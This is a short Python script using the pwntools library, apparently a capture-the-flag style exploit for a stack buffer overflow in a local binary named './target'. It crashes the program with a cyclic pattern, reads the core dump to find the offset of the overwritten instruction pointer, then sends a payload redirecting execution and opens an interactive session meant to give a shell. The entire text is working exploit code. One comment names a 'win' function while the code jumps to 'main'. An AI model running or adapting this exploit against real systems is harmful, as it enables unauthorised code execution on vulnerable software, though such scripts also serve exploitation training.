from pwn import *

exe = './target'

# Generate a cyclic pattern so that we can auto-find the offset
payload =  cyclic(128)

# Run the process once so that it crashes
io = process(exe)
io.send(payload)


# Get the core dump
core = Coredump('./core')

# Our cyclic pattern should have been used as the crashing address
assert pack(core.eip) in payload

# Cool! Now let's just replace that value with the address of 'win'
crash = ELF('./target')
payload = fit({
    cyclic_find(core.eip): p32(crash.symbols.main)
})

# Get a shell!
io = process(exe)
print(io.recvline())
io.send(payload)
io.interactive()
